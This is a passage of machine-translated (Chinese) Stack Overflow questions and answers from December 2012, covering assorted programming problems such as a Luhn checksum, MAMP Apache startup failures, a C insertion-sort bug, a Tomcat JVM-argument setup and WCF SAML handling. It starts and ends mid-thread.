试试[Apache commons-validator library](http://commons.apache.org/validator/)[`LuhnCheckDigit()`](http://commons.apache.org/validator/apidocs/org/apache/commons/validator/routines/checkdigit/LuhnCheckDigit.html)的 apache commons实用方法。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-13T23:21:26.237

您可能希望首先考虑将整数拆分为数字：[将 int 值拆分为单独的数字](https://stackoverflow.com/questions/5196186/split-int-value-into-seperate-digits)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-13T23:23:05.300

如果 Blender 的评论是正确的，你可以这样做：

```
int num=123; // or whatever
String str=Integer.toString(num);
int total=0;
if(str.length()>1){
    for(int i=0; i<str.length(); i++){
        total+=Integer.parseInt(str.charAt(i));
    }
}
System.out.println(total); 
```

（我没有运行这个，所以可能有一些错误）

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-13T23:27:05.163

我认为一个简单的方法是

```
if (num1 > 9) num1 = num1-9 
```

如果您查看原始数字乘以 2 后的样子，则此方法有效。

```
num  num*2  result
0    0      0
1    2      2
2    4      4
3    6      6
4    8      8
5    10     1
6    12     3
7    14     5
8    16     7
9    18     9 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-12-13T23:39:21.370

我认为您计算总数的代码应该是

```
int totalSum = 0;
for (i=0; i<num.length; i+=2) {
    totalSum+=num[i+1];
    if (num[i+2]>4) {
        totalSum+=1+((num[i+2]*2) % 10); 
    } else {
        totalSum+=num[i+2]*2;
    }
} 
```

这避免了任何缓慢的字符串转换。

# php - PHP循环已被选中元素值 我下面的循环找到了“选定”的第一个实例，然后就没有了。输出应为 FARM 和 COUNTRY 显示“已选择”，但只有农场返回。示例输出如下。我知道这只是我有 WHILE、FOR 和 IF 语句的顺序，但我无法弄清楚。部分样本输出：未选择类别“SKY”类别未选择“FARM”类别未选择“CITY”类别未选择“TOWN”类别未选择“COUNTRY”$row 的值为100，$wordChunks 为2。$wordChunks = explode (" | ", $cate

> ID：13870195
> 
> 赞同：2
> 
> 时间：2012-12-13T23:13:07.667
> 
> 标签：php, loops, if-statement, for-loop, while-loop

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-13T23:29:05.137

看一下这个，

```
 while ($row = mysql_fetch_array($rs))
    {
        if (in_array($row['category_name'], $wordChunks))
        {
            echo "category selected \"" . $row['category_name'] . "\"<br />";
        }
        else
        {
            echo "category NOT selected \"" . $row['category_name'] . "\"<br />";
        }
    } 
```

请不要使用`mysql_*`扩展，`mysqli_*`而是使用。

# html - Maven + JSP - 为什么不显示图像？

> ID：13870199
> 
> 赞同：0
> 
> 时间：2012-12-13T23:13:31.717
> 
> 标签：html, image, jsp, maven

浏览器不显示图像。我将此添加到我的 servlet-Context.xml 中：

```
<mvc:resources mapping="/images/**" location="/images/" /> 
```

在 home.jsp 中：

```
<img src="images/header.png"> 
```

它不显示图像:(为什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-13T23:42:20.050

使用 jstl 标签

```
<img src="<c:url value="images/header.png"/>"/> 
```

# iphone - UIView 内的 UITableView 无法与 UITextField 一起正常工作

> ID：13870200
> 
> 赞同：-1
> 
> 时间：2012-12-13T23:13:33.430
> 
> 标签：iphone, objective-c, ios, xcode, uitableview

好的，伙计们，这就是问题所在。我在 UIView 中加载 UITableView 并且它没有显示两个文本字段：

。H：

```
#import <UIKit/UIKit.h>

@interface LoginViewController : UIViewController <UITableViewDelegate, UITableViewDataSource, UITextFieldDelegate> {

    UITableView *loginTableView;
    UITextField *username;
    UITextField *password;

}

@property UITableView *loginTableView;
@property UITextField *username;
@property UITextField *password;

@end 
```

米：

```
#import <QuartzCore/QuartzCore.h>
#import "LoginViewController.h"

@interface LoginViewController ()

@end

@implementation LoginViewController

@synthesize loginTableView, username, password;

- (void)viewDidLoad {

    [super viewDidLoad];

    // Make rounded corners view
    [self.view.layer setCornerRadius:4.0];
    [self.view.layer setMasksToBounds:YES];
    self.view.layer.opaque = NO;
    self.view.backgroundColor = [UIColor whiteColor];

    // Add login table view to main view
    loginTableView = [[UITableView alloc] initWithFrame:CGRectMake(0, 0, self.view.bounds.size.width, self.view.bounds.size.height)];
    loginTableView.delegate = self;
    loginTableView.dataSource = self;
    [self.view addSubview:loginTableView];

}

- (void)didReceiveMemoryWarning {

    [super didReceiveMemoryWarning];

}

- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section{

    return 2;

}

- (UITableViewCell *)tableView:(UITableView *)table cellForRowAtIndexPath:(NSIndexPath *)indexPath {

    UITableViewCell *cell = [table dequeueReusableCellWithIdentifier:@"Cell"];

    if( cell == nil) {
         cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:@"Cell"];
    }
    if (indexPath.row == 0) {
        username = [[UITextField alloc] initWithFrame:CGRectMake(5, 0, 280, 21)];
        username.placeholder = @"Username";
        username.autocorrectionType = UITextAutocorrectionTypeNo;
        [username setClearButtonMode:UITextFieldViewModeWhileEditing];
        cell.accessoryView = username;
    }
    if (indexPath.row == 1) {
        password = [[UITextField alloc] initWithFrame:CGRectMake(5, 0, 280, 21)];
        password.placeholder = @"Password";
        password.secureTextEntry = YES;
        password.autocorrectionType = UITextAutocorrectionTypeNo;
        [password setClearButtonMode:UITextFieldViewModeWhileEditing];
       cell.accessoryView = password;
    }

    username.delegate = self;
    password.delegate = self;

    [loginTableView addSubview:username];
    [loginTableView addSubview:password];

    cell.selectionStyle = UITableViewCellSelectionStyleNone;
    return cell;

}

- (NSInteger)numberOfSectionsInTableView:(UITableView *)tableView{

    return 1;

}

@end 
```

谁能告诉我我做错了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-13T23:27:04.757

看起来您正在将文本字段添加到 tableview 而不是实际的单元格

```
[loginTableView addSubview:username]; //you're saying to add it to the table 
```

另外，您要添加`username`两次

编辑：

[您可能想查看其他 SO question](https://stackoverflow.com/questions/409259/having-a-uitextfield-in-a-uitableviewcell)

# php - 如何使用 PHP 显示数百张随机图像中的 50 张？

> ID：13870201
> 
> 赞同：0
> 
> 时间：2012-12-13T23:13:33.147
> 
> 标签：php, database, random, duplicates

> **可能重复：**
> [MySQL 从 600K 行中快速选择 10 个随机行](https://stackoverflow.com/questions/4329396/mysql-select-10-random-rows-from-600k-rows-fast)

网上有很多不同的例子，但我希望有人有一个适合我正在寻找的解决方案......当然我不能是唯一的！

我正在建立一个摄影网站，并希望在登录页面上显示 50 多个图像缩略图。踢球者是我希望它使用 PHP 随机显示图片并且没有重复。我还希望每张图片都有自己独特的 href 和 title 参数。

因此，我创建了一个 mySQL 表，其中包含：

```
id image_path, image_href, image_title 
```

我想我可以轻松地自行调整图像的大小并将它们放在根目录的文件夹中，然后在 image_path 行中调用它。

有谁知道如何以最有效的方式做到这一点？我听说当数据库变大时 rand() 很糟糕。该数据库将增长到数以万计的图像。

如果您需要/想要澄清，请告诉我。

谢谢！！！

编辑：我可能在我的研究中遇到过答案，但我对 PHP 还是很陌生... :)

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-13T23:17:03.683

您可以查询数据库，对结果进行排序`RAND()`并选择前 50 个：

```
SELECT id, image_path, image_href, image_title 
FROM table 
ORDER BY RAND()
LIMIT 50 
```

这保证没有重复的结果，除非您的表本身有重复。

这个问题概述了一种更快的方法：[MySQL select 10 random rows from 600K rows fast](https://stackoverflow.com/questions/4329396/mysql-select-10-random-rows-from-600k-rows-fast)

# android - 为什么有两个 AdView 横幅？

> ID：13870205
> 
> 赞同：1
> 
> 时间：2012-12-13T23:13:49.507
> 
> 标签：android, admob

正如下面我的布局代码部分所述，我的布局应该将我的 AdView 横幅定位在屏幕的左上角，它确实如此。但在某些情况下，它还会在屏幕中央显示一个大小相同、内容不同的附加横幅（“坏横幅”）。请参阅我的平板电脑全屏 (1280x800) 的附加屏幕截图。

我的代码中只有一个 AdView 实例。

我不知道它是否相关，但是当我的应用程序通过另一个应用程序的意图过滤器（ACTION_VIEW）启动时似乎会发生这种情况，但在正常启动时不会发生。

知道第二个（烦人的）横幅可能来自哪里吗？

见截图：http: [//i.stack.imgur.com/uYnlm.jpg](http://i.stack.imgur.com/uYnlm.jpg)

```
 <LinearLayout
        xmlns:ads="http://schemas.android.com/apk/lib/com.google.ads"
        android:id="@+id/layout_header"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:gravity="left"
        android:orientation="horizontal" >

        <com.google.ads.AdView
            android:id="@+id/adView"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            ads:adSize="BANNER"
            ads:adUnitId="a150a91e636e7f9"
            ads:color_bg="ffffffff"
            ads:loadAdOnCreate="true"
            android:gravity="top" />

        <ImageButton
            android:id="@+id/header_icon_logo"
            android:padding="0dp"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:gravity="center" />

    </LinearLayout> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-14T04:38:39.900

您的代码似乎是正确的，尝试清理您的项目并再次运行。另一种解决方案是，一旦从 xml 中删除您的 imageview，然后检查输出。

# macos - Apache 不在 OSX 中的 MAMP 中启动（但 MySQL 工作）

> ID：13870206
> 
> 赞同：62
> 
> 时间：2012-12-13T23:13:55.677
> 
> 标签：macos, apache, mamp

我已经让 MAMP 工作了几个月，最近安装了 PostgreSQL。它还建议安装 Apache，我这样做是为了确保 PostgreSQL 工作正常。然后我卸载了 PostgreSQL 和 apache 版本并尝试重新启动 MAMP。它启动了 MySQL 数据库（绿灯），但 Apache 没有启动。我卸载并重新安装了 MAMP 只是为了面临同样的问题。

Apache 似乎没有在 MAMP 文件夹中记录任何错误，因此没有任何错误要报告，我正在努力从哪里开始修复它。我希望这与我安装了另一个导致问题的版本（并删除了它）有关，但我太缺乏经验，不知道我做了什么。

如果不在 MAMP 文件夹中，我在哪里可以找到任何错误？不在：

*   /应用程序/MAMP/库/日志
*   /应用程序/MAMP/bin/日志

* * *

## 回答 #1

> 赞同：152
> 
> 时间：2014-06-18T13:55:41.703

使用命令行停止 Apache 为我解决了这个问题：

```
sudo apachectl stop 
```

* * *

## 回答 #2

> 赞同：44
> 
> 时间：2015-04-27T21:27:34.357

对于那些升级到优胜美地的人来说，似乎有一个我不太了解的错误，但它很容易修复，正如他们的 Twitter 帐户上发布的那样。

> 10.10 Preview 5 错误的解决方法：将位于“/Applications/MAMP/Library/bin”中的文件“envvars”重命名为“_envvars”（@mamp_en）

* * *

## 回答 #3

> 赞同：40
> 
> 时间：2014-08-02T10:40:11.597

我有一个类似的问题，可以通过在命令行启动 MAMP 中包含的 apachectl 来解决它：

```
$ /Applications/MAMP/Library/bin/apachectl start 
```

这将产生

```
Syntax error on line 427 of /Applications/MAMP/conf/apache/httpd.conf:
Invalid command '\xef\xbf\xbc#AllowOverride', perhaps misspelled or defined by a module not included in the server configuration 
```

此错误消息不在其他任何地方，不在任何日志文件或系统控制台中。（原来我从一个文档文件中复制了一行，该文件复制了一些不适合我的系统的特殊字符——这是多么容易找到！）

这适用于 MAMP 2.0.1，也许在新版本中处理得更好。

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2014-02-11T19:38:36.497

Change the recommended Apache Port from: port 80 to port 81.

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2017-03-28T21:22:51.873

我一直在浏览所有 Stackoverflow 帖子，但没有运气。最后，我遇到了这个： [https ://www.speakinginbytes.com/2013/02/mamp-problems/](https://www.speakinginbytes.com/2013/02/mamp-problems/)

> **有时 Apache 通过 MAMP 设置打开特定文件夹，而该文件夹不再存在。如果您简单地转到 MAMP 并通过首选项按钮更改该设置，您应该能够修复它。**

这对我有用。希望它会帮助别人！

* * *

## 回答 #6

> 赞同：5
> 
> 时间：2014-07-28T01:15:50.660

我知道这是旧的，但以防其他人遇到这个。我的虚拟主机文件 (/Applications/MAMP/conf/apache/extra/httpd-vhosts.conf) 中有错字，导致 Apache 无法启动。直到我手动尝试从命令行 ( `/Applications/MAMP/bin/startApache.sh`) 启动 MAMP 的 Apache 版本，我才看到错误并能够修复它。

* * *

## 回答 #7

> 赞同：5
> 
> 时间：2012-12-14T20:33:06.807

也许是因为原来的 apache 已经打开了。您是否尝试过查看状态？您可以尝试使用此命令将其停止“apachectl status”，然后重新启动 mamp 并查看它是否有效。

* * *

## 回答 #8

> 赞同：3
> 
> 时间：2015-06-28T16:38:06.513

命令行有助于解决此问题。像下面这样，

/Applications/MAMP/Library/bin/apachectl start

/Applications/MAMP/Library/bin/apachectl stop

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2014-02-15T23:06:46.493

如果它在某一时刻工作正常，那么我猜你网络上的其他东西当前正在使用相同的端口来做其他事情。

我也遇到了这个问题：在我的情况下，我已将默认 MAMP Apache 端口从 8888 更改为 80。它工作正常，直到我在网络上的另一台机器上安装了 Web 服务器并调整了本地机器上的 /etc/hosts 以包含新服务器。这意味着端口 80 已在使用中，而 MAMP 的 Apache 无法启动。

解决方案是停止我网络上的第二个 Web 服务器，或者将 MAMP 恢复为 8888。两种方法都运行良好。

* * *

## 回答 #10

> 赞同：2
> 
> 时间：2015-02-10T14:14:32.867

在我的情况下，虚拟主机上的 ssl 证书是错误的。要进行测试，只需暂时从所有 ssl vhost 中停用 ssl 并查看它是否启动。注意：即使没有检查 ssl vhost。

* * *

## 回答 #11

> 赞同：2
> 
> 时间：2013-03-08T22:59:58.553

我有同样的问题。在对没有描述性错误消息感到非常沮丧之后，我意识到我可以检查**应用程序/工具/系统消息**下的“所有消息”日志（或一些类似的路径，因为我刚刚从我的语言在这里翻译）。在那里我找到了解释，在我的情况下，这意味着库链接已损坏（可能是由于卸载了 postgres）。我通过重新创建链接解决了这个问题。就我而言，这意味着我必须在终端中运行以下命令：

```
sudo ln -s /usr/lib/libpq.5.3.dylib /usr/lib/libpq.5.dylib 
```

现在它可以工作了！

* * *

## 回答 #12

> 赞同：2
> 
> 时间：2017-07-27T14:11:57.467

1) 退出 MAMP

2）使用命令行运行：

```
$ sudo apachectl restart 
```

3) 打开 MAMP 并启动 Apache

4) Apache 这次应该运气好

* * *

我的情况是，当我使用命令行运行时：

```
$ sudo apachectl stop 
```

没有改变。当我使用命令行运行时：

```
$ sudo apachectl start 
```

我收到了消息

```
httpd (pid 600) already running 
```

我尝试重新启动，但它起作用了。

* * *

## 回答 #13

> 赞同：1
> 
> 时间：2014-08-26T12:07:20.393

如果您的 htdocs（或等效）文件夹存储在外部存储中，您可能需要在 apache 启动之前连接到它（在 finder 中，或使用 cmd + K）。

* * *

## 回答 #14

> 赞同：1
> 
> 时间：2012-12-17T10:54:34.200

为了解决这个特殊问题，我重新安装了 PostgreSQL 和它附带的 apache 版本，然后我再次安装了 MAMP，MAMP 工作正常。

* * *

## 回答 #15

> 赞同：1
> 
> 时间：2015-01-18T16:48:21.167

我遇到了这个问题，结果发现一个不是 vhosts 文件的 .txt 文件以某种方式保存到了`sites-available`Apache 自动包含的我的文件夹中，并且期望每个文件都是 vhosts 文件。

* * *

## 回答 #16

> 赞同：0
> 
> 时间：2016-02-03T17:01:48.803

还要确保您没有启动旧版本的 MAMP。这发生在我使用聚光灯查找 MAMP 时。当应用程序升级时，它会在您的应用程序文件夹中保留较旧的副本。

# c - 运行时检查失败 #2 - 变量“arr2”周围的堆栈已损坏

> ID：13870208
> 
> 赞同：0
> 
> 时间：2012-12-13T23:14:16.763
> 
> 标签：c, arrays, sorting, insertion-sort

```
int arr2[5]={5,4,3,2,1};
sortArray(arr2, 5);

void sortArray(int data[], int size)
{
    int i, j;
    int element;

    for (i = 1; i < size; i++)
    {
        element = data[i];
        j = i-1;

        while (j >= 0 && element < data[j])
        {
            data[j+1] = data[j];
            j--;
        }

        data[j] = element;
    }
} 
```

我的函数出现此错误，当函数结束时，我的数组看起来像 {5,5,5,5,5}，为什么会这样？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-14T00:08:29.157

如上所述：在 for 循环的第一次迭代期间，执行 while 循环后，j 递减为 -1，然后用作数据数组中的索引；这是堆栈损坏的原因。

有关堆栈损坏的更多信息：当您引用数组的某个索引（IE data[j]）时，您基本上是在说“从名为 data 的指针指向的内存位置开始，添加 j * sizeof(int ) 字节，并获取该值'。

在代码中，`data[j]`等价于`*(data + (j * sizeof(int)))`. 当你给出一个负值时，你引用了没有分配给数据数组的内存；在这种情况下，内存恰好是堆栈的一部分。因为您正在修改它，所以您会收到堆栈损坏错误。

# c++ - 在工厂模型中使用 const_cast

> ID：13870209
> 
> 赞同：0
> 
> 时间：2012-12-13T23:14:21.403
> 
> 标签：c++, qt, factory, const-cast

如果我的命名不正确，请原谅/纠正我。

我一直不明白`const_cast`. 一般来说，在我看来，如果您必须使用，`const_cast`那么您的类/方法可能存在根本缺陷[，除非您使用的是不正确的遗留函数](https://stackoverflow.com/questions/2673508/correct-usages-of-const-cast)。然而，我可能偶然发现了一个适合使用它的案例。我有一个大类，有几个成员在构造过程中分配，并在对象的*使用寿命*内保持不变。

因为这些对象经常被销毁和构造，所以我想尝试一下我认为被称为工厂模型的方法：我不想创建/销毁对象，而是将其检索/返回到未分配对象的缓存中。例如（当然是简化的）：

```
class PersonFactory {
public:
    const Person* getPerson(const QString& newname) {
    //I can't assign the new name because it's const
        if(m_personCache.isEmpty())
            return createNewPerson();
        else
            return m_personCache.pop();
    }
    void returnPerson(Person* person) { m_personCache.push(person); person = 0; }
    static PersonFactory* instance;
private:
    Person* createNewPerson() const { return new Person(""); }
    QStack<Person*> m_personCache;
}

class Person {
public:
    friend Person* PersonFactory::createNewPerson();

    const QString& name() const {
        return m_name;
    }

    void destroy() {
        PersonFactory::returnPerson(this);
    }
private:
    Person(QString name) : m_name(name) {}
    //m_name is const and should remain that way to prevent accidental changes
    const QString m_name;
} 
```

我无法指定新名称，因为它是`const`. 这是一个很好的案例`const_cast`还是我错过了一个明显的选择？使用会`const_cast`导致性能下降吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-13T23:20:12.743

> 使用 const_cast 会导致性能下降吗？

也许。`const`当一个对象实际上是`const`产生未定义的行为时，丢弃以存储一个值。除其他外，未定义的行为可能表现为性能下降。

# autofill - 自动填充已定义的随机文本 - Firefox 插件

> ID：13870213
> 
> 赞同：2
> 
> 时间：2012-12-13T23:14:33.733
> 
> 标签：autofill

我正在使用自动填充插件`https://addons.mozilla.org/pl/firefox/addon/autofill-262804/`，我想用定义的随机文本填充我的文本字段。例如，我想`/* City */ city|town`用定义之一填充字段：`London, Paris, Amsterdam`

但我不知道该怎么做。

开发商说：

> 变量——使用特殊变量输出随机单词（文本微调器）、数字和字母数字字符

所以这是可能的。

请帮我。

# 编辑

或者您是否知道使用定义的随机文本自动填充字段的任何插件/方法

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-08-19T04:24:40.610

尽管对您的问题给予了赏金，但我还是设法找到了解决方案 - 我也很难在 Google Groups 页面和开发人员的网站中找到它，直到我找到他的[“其他”页面](http://www.tohodo.com/autofill/help-firefox.html#other)，其中指出：

展开变量 – 如果选中此框，{...} 将替换为变量的输出。目前可以使用三种类型的变量：

```
{word1|word2|...} – This variable acts like a text spinner, randomly outputting one word from a list of words that you specify. Example: to output "house", "condo", "apartment", or "flat", you would enter {house|condo|apartment|flat}
{#} or {#number} – This variable outputs a random number. You can specify the number of digits after # ({#1} is equivalent to {#}). Example: to generate a random telephone number, you would enter ({#3}) {#3}-{#4}
{$} or {$number} – This variable outputs a random alphanumeric string. You can specify the number of characters after $ ({$1} is equivalent to {$}). Example: to generate a 16-character dummy text string, you would enter {$16} 
```

因此，例如，在为您的元素自动填充框的值中，放置：

```
{$6}@{$6}.com 
```

将插入一个由 6 个随机字母组成的电子邮件地址，然后是一个 @，然后是六个随机字母，最后是一个 .com。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-08-25T22:38:06.247

自动填充的值应该是：

```
 {London|Paris|Amsterdam} 
```

# android - Phonegap 2.2 错误创建 Android 项目

> ID：13870221
> 
> 赞同：0
> 
> 时间：2012-12-13T23:15:32.993
> 
> 标签：android, windows, cordova

我正在尝试使用phonegap 2.2创建一个项目，在我执行de“create”语句之前一切正常。我抛出以下错误：

```
Creating new android project...
Copying js, jar & config.xml files...
Copying cordova command tools...
Updating AndroidManifest.xml and Main Activity...
create.js<31,5> Runtime error in Microsoft JScript: Access route not found 
```

然后项目被创建，但是用eclipse打开它会抛出以下错误：

```
<BIG RED X> Invalid project description 
Reason: Invalid project description 
```

不知道为什么会这样...

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-14T06:12:03.630

在

**Eclipse 帮助 > 安装新软件**

该`Name`字段是可选的，`MDS AppLaud 1.2`建议

在`Location`中，进入下载站点：

```
http://svn.codespot.com/a/eclipselabs.org/mobile-web-development-with-phonegap/tags/r1.2/download 
```

然后打

**选择确定**

最后

**全部接受**。 ![在此处输入图像描述](../Images/a8823cae3aeedc28c736b6c23fba4bae.png)

# html - 拖动带有 alpha PNG backgroundImage 的 DOMElement 会丢失 alpha

> ID：13870222
> 
> 赞同：3
> 
> 时间：2012-12-13T23:15:33.713
> 
> 标签：html, google-chrome, drag-and-drop, webkit, png

我有许多块元素，它们的背景图像在图像形状之外是透明的。它显示得很好，但是当我在 Google Chrome 中拖动它时，它拖动得很好，但是 backgroundImage 的 alpha 部分显示为纯白色。

```
.documents {
 background-image: url('foldedcorner_document-sprite.png');
 -webkit-user-drag: element; 
 -webkit-user-select: none;
 /* ... */
} 
```

这是 Chrome 错误吗？我本可以发誓不久前找到了对它的引用，但现在我试图再次解决它，我到处搜索都找不到任何东西，我也没有任何运气。我可以成功分配完全相同的 PNG 的 dragImage，但随后我丢失了我正在拖动的元素的内容，这是在拖动过程中保留的必要内容。

# eclipse - 如何在 Eclipse 和使用 startup.bat 的 tomcat 中设置 JVM 参数

> ID：13870225
> 
> 赞同：21
> 
> 时间：2012-12-13T23:15:51.260
> 
> 标签：eclipse, tomcat, tomcat7, eclipse-wtp

我在要部署我的应用程序的 Windows 上安装了 Tomcat 7。我需要为服务器上运行的应用程序设置几个 JVM 参数。在网上搜索时，我发现了两个（如果算上 Windows 服务，则为三个）阵营：

**对于那些使用日食的人：**

双击服务器 > 打开启动配置 > 参数选项卡

**对于那些使用tomcat的启动脚本的人：**

创建一个 setenv.bat（或 Linux 的 setenv.sh）并设置 CATALINA_OPTS 或 JAVA_OPTS

然而，它们似乎是相互排斥的。在 eclipse 中设置参数（+1，如果你能知道它们的存储位置）不会影响启动脚本，并且在 eclipse 中启动时设置 setenv.bat 属性不会影响服务器。两者都单独工作。

两者都指向相同的安装，并且在服务器概述页面上的 eclipse 中，我选择了“使用 Tomcat 安装（控制 Tomcat 安装）。

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-12-17T16:23:32.110

正如我在上面的评论中提到的，看起来 WTP 插件不调用启动脚本，而是通过 java 可执行文件直接调用 Tomcat。因此，来自 eclipse 的 VM 参数直接放在命令行上，而不是存储在诸如 setenv.bat 之类的配置文件中，也不会从启动时从这样的配置文件中读取。因此两者在配置上是完全分开的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2021-07-18T23:46:08.900

据我所知，你不能在 tomcat 中做到这一点，应该在 eclipse 的设置中做额外的工作。
如果您的项目是 Eclipse 的动态 Web 项目，请转到 menu>runAs>runConfiguration 并在 environment 选项卡中，添加 SetEnv.bat 中的那些参数。如果您的项目是多模块 mavenized 项目，请在 pom 文件中运行具有 war 打包的模块的配置并进行上述设置。此外，在参数选项卡中，您可以指定程序参数和 VM 参数。注意：startup.bat 运行另一个bat 文件，它们可能会设置另一个参数。如果您遇到任何错误，您可以检查其他 bat 文件。

# c - 函数“sum”的隐式声明在 C99 中无效

> ID：13870227
> 
> 赞同：5
> 
> 时间：2012-12-13T23:16:09.763
> 
> 标签：c, xcode

我一直在寻找解决方案，但没有找到任何有用的方法。我收到以下错误：

```
Implicit declaration of function 'sum' is invalid in C99 
```

```
Implicit declaration of function 'average' is invalid in C99 
```

```
Conflicting types for 'average' 
```

有谁之前经历过这个吗？我正在尝试在 Xcode 中编译它。

```
#import <Foundation/Foundation.h>

    int main(int argc, const char * argv[])
    {

       @autoreleasepool
       {
          int wholeNumbers[5] = {2,3,5,7,9};
          int theSum = sum (wholeNumbers, 5);
          printf ("The sum is: %i ", theSum);
          float fractionalNumbers[3] = {16.9, 7.86, 3.4};
          float theAverage = average (fractionalNumbers, 3);
          printf ("and the average is: %f \n", theAverage);

       }
        return 0;
    }

    int sum (int values[], int count)
    {
       int i;
       int total = 0;
       for ( i = 0; i < count; i++ ) {
          // add each value in the array to the total.
          total = total + values[i];
       }
       return total;
    }

    float average (float values[], int count )
    {
       int i;
       float total = 0.0;
       for ( i = 0; i < count; i++ ) {
          // add each value in the array to the total.
          total = total + values[i];
       }
       // calculate the average.
       float average = (total / count);
       return average;
    } 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-12-13T23:20:12.233

您需要为这两个函数添加声明，或者将这两个函数定义移到 main 之前。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-12-13T23:18:48.147

问题是，当编译器看到您使用的代码时，`sum`它并不知道任何具有该名称的符号。您可以转发声明它以解决问题。

```
int sum (int values[], int count); 
```

把它放在前面`main()`。这样，当编译器第一次看到它的使用时，`sum`它就知道它存在并且必须在其他地方实现。如果不是，那么它将给出一个班轮错误。

# .net - 如何处理 saml:WCF 中的断言？

> ID：13870229
> 
> 赞同：1
> 
> 时间：2012-12-13T23:16:15.957
> 
> 标签：.net, wcf, wcf-security

WCF 新手，但非常熟悉过去的 WSE* 范例。我发现 WCF 的可配置性（阅读：复杂性）是一个相当大的挑战。

我正在尝试使用 .NET 4.0 WCF 客户端来使用我们政府提供的在 WebSphere Application Server/6.1 上运行的 Web 服务。

他们的方案使用 UsernameToken 通过 HTTPS 传输加密进行身份验证和交换 SAML 断言。此 SAML 断言用于其服务的其余操作。

当尝试“登录”（即获取 SAML 断言）时，当 WCF 尝试处理返回的 SOAP 时，我收到以下异常：

**“找不到 'System.IdentityModel.Tokens.SamlSecurityToken' 令牌类型的令牌身份验证器。根据当前的安全设置，无法接受该类型的令牌。”**

这是我的设置文件：

```
<system.serviceModel>
<client>
  <endpoint binding="basicHttpBinding"
            bindingConfiguration="Default"
            contract="ServiceProxy.Login"
            name="Login" />
</client>
<bindings>
  <basicHttpBinding>
    <binding name="Default">
      <security mode="TransportWithMessageCredential">
        <transport clientCredentialType="None"/>
        <message clientCredentialType="UserName" />
      </security>
    </binding>

  </basicHttpBinding>
</bindings>
</system.serviceModel> 
```

这是 SOAP 请求：

```
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" xmlns:u="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">
  <s:Header>
    <!-- Removed -->
    <ActivityId CorrelationId="c9363270-1b33-4ffe-90b0-427feebcebf6" xmlns="http://schemas.microsoft.com/2004/09/ServiceModel/Diagnostics">cadd6a3c-7b36-46eb-9130-390227effc08</ActivityId>
    <o:Security s:mustUnderstand="1" xmlns:o="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd">
      <u:Timestamp u:Id="_0">
        <u:Created>2012-12-13T22:50:22.308Z</u:Created>
        <u:Expires>2012-12-13T22:55:22.308Z</u:Expires>
      </u:Timestamp>
      <o:UsernameToken u:Id="uuid-91607d82-da2c-4004-93b6-baf5973ba057-1">
        <o:Username>
          <!-- Removed-->
        </o:Username>
        <o:Password>
          <!-- Removed-->
        </o:Password>
      </o:UsernameToken>
    </o:Security>
  </s:Header>
  <s:Body xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
    <LoginRequest xmlns="http://snipped.url/Services.xsd"></LoginRequest>
  </s:Body>
</s:Envelope> 
```

这是使 WCF 窒息的响应：

```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
      <!-- Removed -->
      <o:Security xmlns:o="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd" xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:mustUnderstand="1">
        <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:1.0:assertion" AssertionID="id-94ef81a2eba3b246e284f72c3313e32ababe9482" IssueInstant="2012-12-13T22:50:23.930Z" Issuer="http://www.forumsys.com/sentry" MajorVersion="1" MinorVersion="1">
          <saml:Conditions NotBefore="2012-12-13T22:50:23.930Z" NotOnOrAfter="2012-12-14T08:50:23.930Z"></saml:Conditions>
          <saml:AuthenticationStatement AuthenticationInstant="2012-12-13T22:50:23.930Z" AuthenticationMethod="urn:oasis:names:tc:SAML:1.0:am:password">
            <saml:Subject>
              <saml:NameIdentifier>
                <!-- Removed-->
              </saml:NameIdentifier>
              <saml:SubjectConfirmation>
                <saml:ConfirmationMethod>urn:oasis:names:tc:SAML:1.0:cm:sender-vouches</saml:ConfirmationMethod>
              </saml:SubjectConfirmation>
            </saml:Subject>
            <saml:SubjectLocality>
              <!-- Removed-->
            </saml:SubjectLocality>
          </saml:AuthenticationStatement>
          <saml:AttributeStatement>
            <saml:Subject>
              <saml:NameIdentifier>
                <!-- Removed-->
              </saml:NameIdentifier>
              <saml:SubjectConfirmation>
                <saml:ConfirmationMethod>urn:oasis:names:tc:SAML:1.0:cm:sender-vouches</saml:ConfirmationMethod>
              </saml:SubjectConfirmation>
            </saml:Subject>
            <saml:Attribute AttributeName="SMSESSION" AttributeNamespace="http://www.forumsys.com/sentry">
              <saml:AttributeValue>
                <!-- Removed-->
              </saml:AttributeValue>
